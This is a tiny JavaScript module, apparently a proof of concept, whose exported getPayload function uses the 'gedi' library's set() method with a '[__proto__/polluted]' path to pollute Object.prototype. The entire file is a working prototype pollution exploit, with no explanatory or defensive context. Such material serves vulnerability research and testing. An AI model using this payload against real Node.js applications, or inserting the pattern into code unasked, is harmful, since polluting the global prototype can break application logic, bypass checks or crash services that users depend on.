function getPayload() {
    const gedi = require("gedi");
    gedi().set("[__proto__/polluted]", "yes");
}

module.exports = { getPayload };